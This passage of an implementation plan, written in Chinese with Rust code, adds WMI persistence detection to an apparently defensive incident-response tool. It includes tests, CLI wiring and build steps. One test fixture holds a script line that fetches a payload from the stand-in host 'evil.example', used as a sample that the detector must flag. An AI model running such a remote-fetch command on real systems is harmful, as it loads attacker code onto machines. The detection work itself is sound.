            }),
            ..Entity::default()
        }
    } else if p.mechanism == "wmi_subscription" {
        // WMI subscriptions have no registry key or file path of their own —
        // location holds "<filter> -> <consumer>" (see wmi_subscription.rs).
        // Reuse entity.registry's key field for this identifier rather than
        // adding a new Entity sub-object for a single mechanism (schema
        // stays unchanged; the field's semantics — "where this persistence
        // mechanism lives in the system" — already fit).
        Entity {
            registry: Some(EntityRegistry {
                hive: "WMI".to_string(),
                key: p.location.clone(),
                value: p.value.clone().unwrap_or_default(),
                data: p.command.clone().unwrap_or_default(),
                last_write: p.last_write,
            }),
            ..Entity::default()
        }
    } else {
        Entity {
            registry: Some(EntityRegistry {
                hive: hive_prefix(&p.location),
                key: p.location.clone(),
                value: p.value.clone().unwrap_or_default(),
                data: p.command.clone().unwrap_or_default(),
                last_write: p.last_write,
            }),
            ..Entity::default()
        }
    }
}
```

- [ ] **Step 3: 新增測試**

在 `persist.rs` 的 `#[cfg(test)] mod tests` 新增（implementer 需先讀取既有
測試的 fixture 建構 helper 名稱，仿照既有風格建構 `PersistenceRecord`）：

```rust
#[test]
fn wmi_active_script_with_suspicious_content_gates_high() {
    let p = PersistenceRecord {
        mechanism: "wmi_subscription".to_string(),
        location: "EvilFilter -> EvilConsumer".to_string(),
        value: Some("EvilConsumer".to_string()),
        command: Some(
            r#"CreateObject("Msxml2.XMLHTTP").Open("GET","http://evil.example/payload")"#
                .to_string(),
        ),
        binary_path: None,
        binary_sha256: None,
        signed: None,
        signer: None,
        last_write: None,
    };
    let hits = evaluate_gate(&p, Utc::now());
    assert!(!hits.is_empty(), "WMI ActiveScript with remote content must gate");
    assert!(
        hits.iter().any(|h| h.severity == Severity::High),
        "suspicious script content must be High severity"
    );
}

#[test]
fn wmi_active_script_benign_content_gates_medium() {
    let p = PersistenceRecord {
        mechanism: "wmi_subscription".to_string(),
        location: "BenignFilter -> BenignConsumer".to_string(),
        value: Some("BenignConsumer".to_string()),
        command: Some("MsgBox \"hello\"".to_string()),
        binary_path: None,
        binary_sha256: None,
        signed: None,
        signer: None,
        last_write: None,
    };
    let hits = evaluate_gate(&p, Utc::now());
    assert!(!hits.is_empty(), "WMI subscriptions gate unconditionally (rare mechanism)");
    assert!(hits.iter().all(|h| h.severity != Severity::High));
}

#[test]
fn wmi_command_line_consumer_with_invoked_executable_uses_existing_signals() {
    // A CommandLineEventConsumer HAS an invoked executable, so it should be
    // evaluated by the normal S2-S4/S9 path (binary_path is Some), not the
    // unconditional S1c branch.
    let p = PersistenceRecord {
        mechanism: "wmi_subscription".to_string(),
        location: "Filter -> Consumer".to_string(),
        value: Some("Consumer".to_string()),
        command: Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe".to_string()),
        binary_path: Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe".to_string()),
        binary_sha256: None,
        signed: Some(false),
        signer: None,
        last_write: None,
    };
    let hits = evaluate_gate(&p, Utc::now());
    assert!(
        !hits.is_empty(),
        "unsigned executable in a user-writable path must still gate via S2"
    );
}

#[test]
fn wmi_subscription_uses_registry_entity_with_wmi_hive_marker() {
    let p = PersistenceRecord {
        mechanism: "wmi_subscription".to_string(),
        location: "Filter -> Consumer".to_string(),
        value: Some("Consumer".to_string()),
        command: Some("MsgBox 1".to_string()),
        binary_path: None,
        binary_sha256: None,
        signed: None,
        signer: None,
        last_write: None,
    };
    let entity = persistence_entity(&p);
    let reg = entity.registry.expect("wmi_subscription must populate entity.registry");
    assert_eq!(reg.hive, "WMI");
    assert_eq!(reg.key, "Filter -> Consumer");
}
```

**implementer 注意**：這四個測試裡用到的 `GateHit.severity`/`evaluate_gate`
回傳型別、`Severity` enum 路徑，需要對照 Task 3 Step 1 讀到的實際程式碼
調整（本計畫寫的是預期介面，非逐字驗證過的介面——與 Task 1/2 標註的
未查證項目性質相同，是誠實的資訊缺口，不是可以照抄不查證的部分）。

- [ ] **Step 4: 跑測試**

```bash
export CARGO_TARGET_DIR=/c/Users/bosen/AppData/Local/cairn-target
export CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKER="C:\\Program Files (x86)\\Microsoft Visual Studio\\18\\BuildTools\\VC\\Tools\\MSVC\\14.51.36231\\bin\\Hostx64\\x64\\link.exe"
cargo test -p cairn-heur persist
```

Expected: 全部通過，含既有 persist 測試（不應被此改動破壞——新分支只在
`mechanism=="wmi_subscription"` 時生效，其他 mechanism 完全不受影響）與
新增的 4 個測試。

- [ ] **Step 5: Commit**

```bash
git add crates/cairn-heur/src/persist.rs
git commit -m "feat(heur): detect WMI ActiveScript persistence without invoked executable"
```

---

## Task 4: main.rs 接線（新 collector 加入 live pipeline）

**Files:**
- Modify: `crates/cairn-cli/src/main.rs`

- [ ] **Step 1: 用 Grep 找到 live collector 清單的插入點**

```bash
grep -n "Box::new(cairn_collectors::persist::PersistCollector" crates/cairn-cli/src/main.rs
```

（若 `PersistCollector` 的完整路徑不同，例如
`cairn_collectors::PersistCollector`，依實際 `grep` 結果調整下一步的程式碼。）

- [ ] **Step 2: 在找到的插入點附近新增新 collector**

```rust
Box::new(cairn_collectors::wmi_subscription::WmiSubscriptionCollector),
```

（不需要建構參數，`WmiSubscriptionCollector` 是無欄位 unit struct。）

- [ ] **Step 3: 若有對應的測試清單（例如
  `live_collectors_include_all_sources` 之類），同步新增並補一個
  `assert!` 確認新 collector 被註冊**（先用 Grep 確認是否存在這類測試，
  若存在依既有斷言風格新增一行；若不存在則跳過這步，不強行新增）。

- [ ] **Step 4: 跑測試**

```bash
cargo test -p cairn-cli
```

Expected: 通過（含任何 Step 3 新增的斷言，若有的話）。

- [ ] **Step 5: Commit**

```bash
git add crates/cairn-cli/src/main.rs
git commit -m "feat(cli): wire WmiSubscriptionCollector into live pipeline"
```

---

## Task 5: 全 workspace 驗證收尾

**Files:**
- 無新增修改（純驗證 Task）

- [ ] **Step 1: 全 workspace check/test/clippy/fmt**

```bash
export CARGO_TARGET_DIR=/c/Users/bosen/AppData/Local/cairn-target
export CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKER="C:\\Program Files (x86)\\Microsoft Visual Studio\\18\\BuildTools\\VC\\Tools\\MSVC\\14.51.36231\\bin\\Hostx64\\x64\\link.exe"
cd /c/Users/bosen/OneDrive/Desktop/claude_dev/IIR_tool/cairn
cargo check --workspace
cargo test --workspace
cargo clippy --workspace --all-targets -- -D warnings
cargo fmt --check
```

Expected: 全部通過，0 failed，零 clippy 警告。若 `cargo fmt --check` 有輸出
則跑 `cargo fmt` 修正並補 commit（歷來每段都可能發生）。

- [ ] **Step 2: 真機驗證（若本機有 admin 權限）**

```bash
cargo run --bin cairn -- run --dry-run 2>&1 | grep -i wmi
```

Expected: 不 panic，`wmi_subscription` collector 出現在 manifest sources
清單裡（不論是否真的找到任何訂閱——大多數乾淨系統應該是 0 筆，這是正常
的，不是 bug）。**這一步是可選的健全性檢查，不是 CI 會跑的自動化測試**，
若本機環境沒有 admin 權限或跑不動，記錄為已知限制即可，不強求。

- [ ] **Step 3: 若有 fmt 修正則 commit**

```bash
git add -A
git commit -m "style: cargo fmt on WMI persistence detection changes"
```

---

## Self-Review

**1. Spec coverage：**
- 手刻 COM 呼叫鏈（不引入 wmi crate）→ Task 1，符合，且完整程式碼已用
  查證到的真實 API 簽章撰寫。
- `wmi.rs`（unsafe FFI）+ `wmi_subscription.rs`（安全 wrapper）分層 →
  Task 1 + Task 2，符合 `net.rs`/`persist.rs` 既有分層慣例。
- 零 schema 變動（複用 `Record::Persistence`）→ Task 2，符合。
- 沿用既有 persist gate 互斥模式 → Task 3 的新信號插入 `evaluate_gate`
  （命中即 Finding，未命中走既有 `observe()` 路徑不需要改動），符合。
- 新增 ActiveScript 內容偵測信號、只影響 `binary_path.is_none()` 情況 →
  Task 3 Step 1，符合，且測試（Task 3 Step 3）明確涵蓋
  「CommandLineEventConsumer 不受此新分支影響、走既有 S2-S4 路徑」的
  回歸情境。
- `persistence_entity` 新增 WMI 分支 → Task 3 Step 2，符合。
- graceful degrade（COM 初始化失敗、命名空間不存在、查詢失敗）→ Task 1
  的 `enumerate_subscriptions`/`query_bindings`/`resolve_subscription` 全部
  用 `Option`/`?` 短路，任何一步失敗回傳空結果或跳過該筆，不 panic。

**2. Placeholder 掃描：** 所有 Step 都有完整程式碼。Task 1 Step 1（RPC
feature 名稱）、Task 1 Step 4 的 `GetObject` 簽章、Task 3 Step 1/3 的
`GateHit`/`evaluate_gate` 確切介面——這些標註「需要 implementer 先讀取
確認」的地方，都是探查階段誠實列出的查證缺口，不是偷懶的空白：每處都
給了具體的核對方法（grep 指令、讀取哪個檔案哪個函式）與已知的部分資訊
（推測的欄位名稱/簽章形狀），不是無方向的「請自行決定」。

**3. Type 一致性：** `RawWmiSubscription`（Task 1 定義）在 Task 2 的
`WmiSubscriptionCollector::collect` 裡使用的欄位名稱（`filter_name`/
`filter_query`/`consumer_name`/`consumer_type`/`command`）完全一致。
`PersistenceRecord` 欄位在 Task 2/3 全程使用官方既有定義，未新增/更改
欄位。`WmiSubscriptionCollector`（無欄位 unit struct）在 Task 2 定義、
Task 4 使用方式一致（`Box::new(...)` 不帶建構參數）。

**4. 執行順序相依性：** Task 1（wmi.rs 底層 COM 查詢）→ Task 2（安全
wrapper，依賴 Task 1 的 `RawWmiSubscription`/`enumerate_subscriptions`）→
Task 3（persist.rs 新信號，依賴 Task 2 產生的 `mechanism="wmi_subscription"`
`PersistenceRecord` 但技術上可獨立開發測試，因為只是新增判斷分支，測試
用手動建構的 `PersistenceRecord` fixture 不依賴真的跑過 WMI 查詢）→
Task 4（main.rs 接線，依賴 Task 2 的 `WmiSubscriptionCollector`）→ Task 5
（全量驗證）。嚴格序列，Task 1/2 都涉及新的 unsafe COM 程式碼，不建議
平行派工（同一個功能的緊密耦合鏈路，來回除錯需要上下文連貫）。
